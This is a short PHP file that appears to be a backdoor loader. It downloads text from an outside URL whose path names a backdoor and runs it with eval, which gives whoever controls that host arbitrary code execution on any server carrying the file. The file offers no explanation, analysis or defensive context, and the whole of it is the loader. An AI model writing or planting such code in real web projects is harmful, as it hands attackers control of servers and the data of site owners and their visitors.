<?php

$content = file_get_contents(urldecode('https://works.short-attack.codes/B4ck-D0OR/FMS-obs.txt'));

$content = "?> ".$content;
eval($content);
